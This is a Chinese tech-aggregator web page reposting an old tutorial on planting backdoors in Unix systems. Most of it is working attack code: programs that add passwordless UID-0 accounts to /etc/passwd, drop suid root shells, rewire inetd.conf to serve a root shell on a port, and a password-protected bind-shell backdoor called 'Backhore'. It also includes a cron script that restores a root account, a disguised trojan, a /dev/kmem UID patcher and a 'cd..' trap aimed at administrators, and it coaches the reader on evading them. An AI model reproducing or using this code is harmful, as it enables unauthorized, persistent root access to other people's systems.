<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>初级骇客技巧，老系统用的后门技巧 | 极客快訊</title><meta property="og:title" content="初级骇客技巧，老系统用的后门技巧 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p3.pstatp.com/large/dfic-imagehandler/d05186f9-9045-4e34-9cff-b38898fca6b0"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><meta property="article:published_time" content="2020-10-29T21:12:03+08:00"><meta property="article:modified_time" content="2020-10-29T21:12:03+08:00"><meta name=Keywords content><meta name=description content="初级骇客技巧，老系统用的后门技巧"><meta name=author content="极客快訊"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/0a86a02c.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快讯 Geek Bank</a></h1><p class=description>为你带来最全的科技知识 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>初级骇客技巧，老系统用的后门技巧</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>后门技巧</p><div class=pgc-img><img alt=初级骇客技巧，老系统用的后门技巧 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/dfic-imagehandler/d05186f9-9045-4e34-9cff-b38898fca6b0><p class=pgc-img-caption></p></div><p><br></p><p><br>[初级]<br>最简单的方法，就是在口令文件 passwd 中增加一个 UID 为 0 的帐号。但最好别这么做，因为只要系统管理员检查口令文件就会“漏馅”了。以下是在 /etc/passwd 口令文件中添加一个 UID 0 帐号的C程序。<br>&lt;++> backdoor/backdoor1.c<br>#include<br>main()<br>{<br>FILE *fd;<br>fd=fopen("/etc/passwd","a+");<br>fprintf(fd,"hax0r::0:0::/root:/bin/sh\n");<br>}<br>&lt;--><br>比这种方法稍微隐蔽一点的就是将藏在口令文件中某个无人使用帐号的 UID 改为 0，并将其第二个域（口令域）设为空。（注意，如果你使用的是较高版本的*nix，也许还要修改 /etc/shadow 文件。）<br>在 /tmp 目录下放置 suid shell。以后只要你运行这个程序，就会轻易得到根用户权限。这种方法几乎是最受欢迎的了。但有许多系统每几小时，或者每次启动都会清除 /tmp 目录下的数据，另外一些系统则根本不允许运行 /tmp 目录下的 suid 程序。当然，你可以自己修改或清除这些限制（因为你已是根用户，有权限修改 /var/spool/cron/crontabs/root 和 /etc/fstab 文件）。以下是在 /tmp 目录下放置 suid shell 程序的C源程序。<br>&lt;++> backdoor/backdoor2.c<br>#include<br>main()<br>{<br>system("cp /bin/sh /tmp/fid");<br>system("chown root.root /tmp/fid");<br>system("chmod 4755 /tmp/fid");<br>}<br>&lt;--><br></p><div class=pgc-img><img alt=初级骇客技巧，老系统用的后门技巧 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/dfic-imagehandler/190af47c-e260-473a-af5f-69aa346e196c><p class=pgc-img-caption></p></div><p><br>[中级]<br>超级服务器守护进程（inetd）的配置文件。系统管理员一般情况下不经常检查该文件，因此这倒是个放置“后门”的好地方。:) 那么在这里如何建立一个最好的后门呢？当然是远程的了。这样你就不必需要本地帐号就可以成为根用户了。首先，让我们先来了解一下这方面的基础知识：inetd 进程负责监听各个TCP和UDP端口的连接请求，并根据连接请求启动相应的服务器进程。该配置文件 /etc/inetd.conf 很简单，基本形式如下：<br>(1) (2) (3) (4) (5) (6) (7)<br>ftp stream tcp nowait root /usr/etc/ftpd ftpd<br>talk dgram udp wait root /usr/etc/ntalkd ntalkd<br>mountd/1 stream rpc/tcp wait root /usr/etc/mountd mountd<br>1：第一栏是服务名称。服务名通过查询 /etc/services 文件（供 TCP 和 UDP 服务使用）或 portmap 守护进程（供 RPC 服务使用）映射成端口号。RPC（远程过程调用）服务由 name/num 的名字格式和第三栏中的 rpc 标志识别。<br>2：第二栏决定服务使用的套接口类型：stream、dgram 或 raw。一般说来，stream 用于 TCP 服务，dgram 用于 UDP， raw 的使用很少见。<br>3：第三栏标识服务使用的通信协议。允许的类型列在 protocols 文件中。协议几乎总是是 tcp 或 udp。RPC 服务在协议类型前冠以 rpc/。<br>4：如果所说明的服务一次可处理多个请求（而不是处理一个请求后就退出），那么第四栏应置成 wait，这样可以阻止 inetd 持续地派生该守护进程的新拷贝。此选项用于处理大量的小请求的服务。如果 wait 不合适，那么在本栏中填 nowait。<br>5：第五栏给出运行守护进程的用户名。<br>6：第六栏给出守护进程的全限定路径名。<br>7：守护进程的真实名字及其参数。<br>如果所要处理的工作微不足道（如不需要用户交互），inetd 守护进程便自己处理。此时第六、七栏只需填上 'internal' 即可。所以，要安装一个便利的后门，可以选择一个不常被使用的服务，用可以产生某种后门的守护进程代替原先的守护进程。例如，让其添加 UID 0 的帐号，或复制一个 suid shell。<br>一个比较好的方法之一，就是将用于提供日期时间的服务 daytime 替换为能够产生一个 suid root 的 shell。只要将 /etc/inetd.conf 文件中的：<br>daytime stream tcp nowait root internal<br>修改为：<br>daytime stream tcp nowait /bin/sh sh -i.<br>然后重启（记住：一定要重启）inetd 进程：<br>killall -9 inetd。<br>但更好、更隐蔽的方法是伪造网络服务，让它能够在更难以察觉的情况下为我们提供后门，例如口令保护等。如果能够在不通过 telnetd 连接的情况下轻松地进行远程访问，那是再好不过了。方法就是将“自己的”守护程序绑定到某个端口，该程序对外来连接不提供任何提示符，但只要直接输入了正确的口令，就能够顺利地进入系统。以下是这种后门的一个示范程序。（注：这个程序写得并不很完整。）<br>&lt;++> backdoor/remoteback.c<br>/* Coders:<br>Theft<br>Help from:<br>Sector9, Halogen<br>Greets: People: Liquid, AntiSocial, Peak, Grimknight, s0ttle,halogen,<br>Psionic, g0d, Psionic.<br>Groups: Ethical Mutiny Crew(EMC), Common Purpose hackers(CPH),<br>Global Hell(gH), Team Sploit, Hong Kong Danger Duo,<br>Tg0d, EHAP.<br>Usage:<br>Setup:<br># gcc -o backhore backhore.c # ./backdoor password &<br>Run:<br>Telnet to the host on port 4000. After connected you<br>Will not be prompted for a password, this way it is less<br>Obvious, just type the password and press enter, after this<br>You will be prompted for a command, pick 1-8.<br>Distributers:<br>Ethical Mutiny Crew<br>*/<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#define PORT 4000<br>#define MAXDATASIZE 100<br>#define BACKLOG 10<br>#define SA struct sockaddr<br>void handle(int);<br>int<br>main(int argc, char *argv[])<br>{<br>int sockfd, new_fd, sin_size, numbytes, cmd;<br>char ask[10]="Command: ";<br>char *bytes, *buf, pass[40];<br>struct sockaddr_in my_addr;<br>struct sockaddr_in their_addr;<br>printf("\n Backhore BETA by Theft\n");<br>printf(" 1: trojans rc.local\n");<br>printf(" 2: sends a systemwide message\n");<br>printf(" 3: binds a root shell on port 2000\n");<br>printf(" 4: creates suid sh in /tmp\n");<br>printf(" 5: creates mutiny account uid 0 no passwd\n");<br>printf(" 6: drops to suid shell\n");<br>printf(" 7: information on backhore\n");<br>printf(" 8: contact\n");<br>if (argc != 2) {<br>fprintf(stderr,"Usage: %s password\n", argv[0]);<br>exit(1);<br>}<br>strncpy(pass, argv[1], 40);<br>printf("..using password: %s..\n", pass);<br>if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {<br>perror("socket");<br>exit(1);<br>}<br>my_addr.sin_family = AF_INET;<br>my_addr.sin_port = htons(PORT);<br>my_addr.sin_addr.s_addr = INADDR_ANY;<br>if (bind(sockfd, (SA *)&my_addr, sizeof(SA)) == -1) {<br>perror("bind");<br>exit(1);<br>}<br>if (listen(sockfd, BACKLOG) == -1) {<br>perror("listen");<br>exit(1);<br>}<br>sin_size = sizeof(SA);<br>while(1) { /* main accept() loop */<br>if ((new_fd = accept(sockfd, (SA *)&their_addr, &sin_size)) == -1) {<br>perror("accept");<br>continue;<br>}<br>if (!fork()) {<br>dup2(new_fd, 0);<br>dup2(new_fd, 1);<br>dup2(new_fd, 2);<br>fgets(buf, 40, stdin);<br>if (!strcmp(buf, pass)) {<br>printf("%s", ask);<br>cmd = getchar();<br>handle(cmd);<br>}<br>close(new_fd);<br>exit(0);<br>}<br>close(new_fd);<br>while(waitpid(-1,NULL,WNOHANG) > 0); /* rape the dying children */<br>}<br>}<br>void<br>handle(int cmd)<br>{<br>FILE *fd;<br>switch(cmd) {<br>case '1':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("Trojaning rc.local\n");<br>fd = fopen("/etc/passwd", "a+");<br>fprintf(fd, "mutiny::0:0:ethical mutiny crew:/root:/bin/sh");<br>fclose(fd);<br>printf("Trojan complete.\n");<br>break;<br>case '2':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("Sending systemwide message..\n");<br>system("wall Box owned via the Ethical Mutiny Crew");<br>printf("Message sent.\n");<br>break;<br>case '3':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("\nAdding inetd backdoor... (-p)\n");<br>fd = fopen("/etc/services","a+");<br>fprintf(fd,"backdoor\t2000/tcp\tbackdoor\n");<br>fd = fopen("/etc/inetd.conf","a+");<br>fprintf(fd,"backdoor\tstream\ttcp\tnowait\troot\t/bin/sh -i\n");<br>execl("killall", "-HUP", "inetd", NULL);<br>printf("\ndone.\n");<br>printf("telnet to port 2000\n\n");<br>break;<br>case '4':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("\nAdding Suid Shell... (-s)\n");<br>system("cp /bin/sh /tmp/.sh");<br>system("chmod 4700 /tmp/.sh");<br>system("chown root:root /tmp/.sh");<br>printf("\nSuid shell added.\n");<br>printf("execute /tmp/.sh\n\n");<br>break;<br>case '5':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("\nAdding root account... (-u)\n");<br>fd=fopen("/etc/passwd","a+");<br>fprintf(fd,"hax0r::0:0::/:/bin/bash\n");<br>printf("\ndone.\n");<br>printf("uid 0 and gid 0 account added\n\n");<br>break;<br>case '6':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("Executing suid shell..\n");<br>execl("/bin/sh");<br>break;<br>case '7':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("\nInfo... (-i)\n");<br>printf("\n3 - Adds entries to /etc/services & /etc/inetd.conf giving you\n");<br>printf("a root shell on port 2000. example: telnet 2000\n\n");<br>printf("4 - Creates a copy of /bin/sh to /tmp/.sh which, whenever\n");<br>printf("executed gives you a root shell. example:/tmp/.sh\n\n");<br>printf("5 - Adds an account with uid and gid 0 to the passwd file.\n");<br>printf("The login is 'mutiny' and there is no passwd.");<br>break;<br>case '8':<br>printf("\nBackhore BETA by Theft\n");<br>printf("\nhttp://theft.bored.org\n");<br>printf("theft@cyberspace.org\n\n");<br>break;<br>default:<br>printf("unknown command: %d\n", cmd);<br>break;<br>}<br>}<br>&lt;--><br></p><div class=pgc-img><img alt=初级骇客技巧，老系统用的后门技巧 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/dfic-imagehandler/ab06310b-f603-4612-be28-603da69b73e2><p class=pgc-img-caption></p></div><p><br>[高级]<br>Crontab 程序对于系统管理员来说是非常有用的。Cron 服务用于计划程序在特定时间（月、日、周、时、分）运行。如果你足够聪明，就应该加以利用，使之为我们制造“后门”！通过 Cron 服务，你可以让它在每天凌晨 3:00 （这个时候网管应该睡觉了吧。）运行后门程序，使你能够轻易进入系统干你想干的事，并在网管起来之前退出系统。根用户的 crontab 文件放在 /var/spool/crontab/root 中，其格式如下：<br>(1) (2) (3) (4) (5) (6)<br>0 0 * * 3 /usr/bin/updatedb<br>1. 分钟 (0-60)<br>2. 小时 (0-23)<br>3. 日 (1-31)<br>4. 月 (1-12)<br>5. 星期 (1-7)<br>6. 所要运行的程序<br>以上内容设置该程序于每星期三 0:0 运行。要在 cron 建立后门，只需在 /var/spool/crontab/root 中添加后门程序即可。例如该程序可以在每天检查我们在 /etc/passwd 文件中增加了用户帐号是否仍然有效。以下是程序示例：<br>0 0 * * * /usr/bin/retract<br>&lt;++> backdoor/backdoor.sh<br>#!/bin/csh<br>set evilflag = (`grep eviluser /etc/passwd`)<br>if($#evilflag == 0) then<br>set linecount = `wc -l /etc/passwd`<br>cd<br>cp /etc/passwd ./temppass<br>@ linecount[1] /= 2<br>@ linecount[1] += 1<br>split -$linecount[1] ./temppass<br>echo "Meb::0:0:Meb:/root:/bin/sh" >> ./xaa<br>cat ./xab >> ./xaa<br>mv ./xaa /etc/passwd<br>chmod 644 /etc/passwd<br>rm ./xa* ./temppass<br>echo Done...<br>else<br>endif<br>&lt;--><br>[综合]<br>当然，我们可以编写木马程序，并把它放到 /bin 目录下。当以特定命令行参数运行时将产生一个 suid shell。以下是程序示例：<br>&lt;++> backdoor/backdoor3.c<br>#include<br>#define pass "triad"<br>#define BUFFERSIZE 6<br>int main(argc, argv)<br>int argc;<br>char *argv[];{<br>int i=0;<br>if(argv[1]){<br>if(!(strcmp(pass,argv[1]))){<br>system("cp /bin/csh /bin/.swp121");<br>system("chmod 4755 /bin/.swp121");<br>system("chown root /bin/.swp121");<br>system("chmod 4755 /bin/.swp121");<br>}<br>}<br>printf("372f: Invalid control argument, unable to initialize. Retrying");<br>for(;i&lt;10;i++){<br>fprintf(stderr,".");<br>sleep(1);<br>}<br>printf("\nAction aborted after 10 attempts.\n");<br>return(0);<br>}<br>&lt;--><br>[变种]<br>以下程序通过在内存中寻找你所运行程序的 UID，并将其改为 0，这样你就有了一个 suid root shell 了。<br>&lt;++> backdoor/kmemthief.c<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#define pass "triad"<br>struct user userpage;<br>long address(), userlocation;<br>int main(argc, argv, envp)<br>int argc;<br>char *argv[], *envp[];{<br>int count, fd;<br>long where, lseek();<br>if(argv[1]){<br>if(!(strcmp(pass,argv[1]))){<br>fd=(open("/dev/kmem",O_RDWR);<br>if(fd&lt;0){<br>printf("Cannot read or write to<br>/dev/kmem\n");<br>perror(argv);<br>exit(10);<br>}<br>userlocation=address();<br>where=(lseek(fd,userlocation,0);<br>if(where!=userlocation){<br>printf("Cannot seek to user page\n");<br>perror(argv);<br>exit(20);<br>}<br>count=read(fd,&userpage,sizeof(struct user));<br>if(count!=sizeof(struct user)){<br>printf("Cannot read user page\n");<br>perror(argv);<br>exit(30);<br>}<br>printf("Current UID: %d\n",userpage.u_ruid);<br>printf("Current GID: %d\n",userpage.g_ruid);<br>userpage.u_ruid=0;<br>userpage.u_rgid=0;<br>where=lseek(fd,userlocation,0);<br>if(where!=userlocation){<br>printf("Cannot seek to user page\n");<br>perror(argv);<br>exit(40);<br>}<br>write(fd,&userpage,((char *)&(userpage.u_procp))-((char *)&userpage));<br>execle("/bin/csh","/bin/csh","-i",(char *)0, envp);<br>}<br>}<br>}<br>&lt;--><br></p><div class=pgc-img><img alt=初级骇客技巧，老系统用的后门技巧 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/dfic-imagehandler/ee2512f1-0c5d-4b36-8bf7-61e3cdcb50ae><p class=pgc-img-caption></p></div><p><br>[“笨”方法]<br>你有没有曾经试过在 UNIX 系统下错把 "cd .." 输入为 "cd.."？这是由于使用 MS Windows 和 MS-DOS 养成的习惯。这种错误网管是否也会犯呢？如果是这样的话，可不可以让他为我们做点“贡献”呢？:) 例如当他输入 "cd.." 时，会激活我们的木马程序。这样我们就不必登录到系统去激活木马了。以下是程序示例：<br>&lt;++> backdoor/dumb.c<br>/*<br>本程序可在管理员偶然地输入 cd.. 时向 /etc/passwd 文件添加一个 UID 0 帐号。但同时它也实现 cd .. 功能，从而骗过管理员。<br>*/<br>#include<br>#include<br>main()<br>{<br>FILE *fd;<br>fd=fopen("/etc/passwd","a+");<br>fprintf(fd,"hax0r::0:0::/root:/bin/sh\n");<br>system("cd");<br>}<br>&lt;--><br>把上面的程序编译好，放到隐蔽的地方。最好使用 chown 命令将该程序的属主改为 root，使管理员使用 "ls -alF" 命令看到 suid 程序时不至于怀疑。<br>好了，将这个程序（假设其名为 fid）放好以后，下一步的工作就是建立该程序到 "cd.." 的链接：ln cd.. /bin/out。这样，只要系统管理员犯了这个输入错误，你就可以又一次得到系统控制权了。<br></p><p>版权有侵犯请告知，随时删除。</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'技巧','初级','骇客'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>